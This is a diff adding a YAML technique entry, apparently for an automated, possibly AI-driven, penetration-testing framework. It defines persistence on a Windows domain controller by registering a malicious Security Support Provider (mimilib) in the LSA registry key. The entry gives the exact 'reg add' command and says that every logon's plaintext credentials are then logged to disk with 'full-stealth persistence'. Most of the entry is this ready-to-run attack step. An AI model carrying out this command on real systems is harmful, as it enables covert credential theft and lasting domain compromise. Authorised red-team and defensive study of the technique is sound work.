@@ -1,0 +1,32 @@
+name: custom_ssp
+category: ad
+description: Persist via malicious Security Support Provider on a DC
+preconditions:
+- domain_joined
+- local_system
+- os==windows
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: reg add HKLM\System\CurrentControlSet\Control\Lsa /v "Security Packages"
+  /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib"
+parser: generic_parser
+expected_effects:
+- ssp_installed
+- domain_persistence
+- cleartext_credentials_logged
+falsifier:
+  pattern: ACCESS_DENIED|ERROR|denied
+  timeout: 30
+model_tier: sonnet
+mechanism: 'Register a malicious SSP DLL into HKLM\System\Lsa\Security Packages. On
+  next boot,
+
+  LSASS loads the DLL and every interactive logon''s plaintext credential is logged
+
+  to disk by the SSP. Full-stealth persistence on a DC.
+
+  '
+references:
+  ocd_mindmap: 'Branch 13: Custom SSP'
+  hacktricks: windows-hardening/active-directory-methodology/custom-ssp.md
+hacktricks_ref: windows-hardening/active-directory-methodology/README.md
